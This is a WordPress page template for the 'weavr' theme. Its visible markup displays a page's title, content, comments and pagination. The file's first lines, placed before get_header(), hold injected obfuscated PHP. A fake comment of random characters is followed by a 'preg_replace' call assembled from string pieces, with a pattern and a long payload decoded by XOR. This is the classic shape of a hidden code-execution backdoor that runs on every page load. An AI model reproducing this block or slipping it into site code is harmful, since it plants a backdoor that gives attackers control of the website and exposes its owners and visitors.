<?php
/*MM7gF8TdrZYYZAThCtmk7Cbw86Xzbze8NtY3oGLyi4bdTlQ
LQXMHfifVlVCWn8mHNGkGaBxQ2alFlgzgQDzD7NboMtAw
XYZN40DHZfoPQbU1Rtolz3uutzL0VEEjgh0MkuCFYmy8SpZ
*/$SbkntEQ='preg_'.'repl'.'a'.'ce'; $wDiTVwn="7cQxG3JofdR0etsB4"^"\x18\x21\x1a\x1c\x30\x7b\x1c\x1a\x05\x2c\x16\x7c6\x3f\x30mQ"; $SbkntEQ($wDiTVwn, "BTzwYhqVqLSA9dhs3Ht9cUtsU13ak3AEyIeIH1IiEtSzwAz51XFQWF325zjLk1AM91gWMC8nzJqg9Zf8MgxanrY41qny8qWLgZ6cpGKl9baFgqi37h4cRMRwLaEUrZGDb3safCubdmihc10qCaXXTkii3C4ryANxtM3Rs1rJWpE1v3wWgLN"^"\x27\x22\x1b\x1bqJ\x18\x30Y\x25\x202\x5c\x10\x40\x2fol\x2bk\x26\x04\x216\x06ehF\x08\x5bf\x18PiCoh\x19\x24\x0dp\x5c\x0f\x26S\x1e\x28p\x60\x0d\x03\x02\x03\x1d\x14Q\x5d\x5d7eK\x0c\x7cm\x1e\x08So\x2bv\x5cV\x18yB\x06Z\x3eV\x09u\x5fM\x03\x0aFj\x01\x04\x15\x0c\x1b\x5d\x12\x60\x7e\x05\x7d\x1fCVak\x05J\x11\x042O\x2d5\x17h\x3aq2\x07\x08\x01\x23\x17F5\x3d\x02\x05\x24\x2b\x06VT\x3cOjU\x19D\x08\x1f\x09\x0f\x19l\x2dg\x3e\x0a\x1d\x05\x3e\x2c\x3ag\x18\x13\x02\x111\x11\x1b\x1b\x29Vu\x2e\x18Ij2\x08\x2cE\x5e\x1aLw\x1ang", "BKdwHVucHDLSKC");  get_header(); ?>

<div class="units-row">

	<section id="main-content" role="main" class="unit-60">
	
		<?php if (have_posts()): while (have_posts()) : the_post(); ?>
		
			<article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
			
				<h1 class="page-title"><?php the_title(); ?></h1>
				
				<?php the_content(); ?>
				
				<?php comments_template( '', true ); // Remove if you don't want page comments ?>
			
			</article>
			
			<?php endwhile; else: ?>
			
			<article>
				<h2 class="page-title"><?php _e( 'Sorry, nothing found.', 'weavr' ); ?></h2>
			</article>	
		
		<?php endif; ?>
		
			<div class="inner-pagination">					
				<?php wp_link_pages(array( 'before' => '<ul class="page-numbers">', 'after' => '</ul>', 'link_before' => '<span>', 'link_after' => '</span>', 'next_or_number' => 'next_and_number', 'separator' => '', 'nextpagelink' => __( 'Next &raquo;', 'weavr' ), 'previouspagelink' => __( '&laquo; Previous', 'weavr' ), 'pagelink' => '%')); ?>
			</div>
			
	</section>

	<?php get_sidebar(); ?>
	
</div>

<?php get_footer(); ?>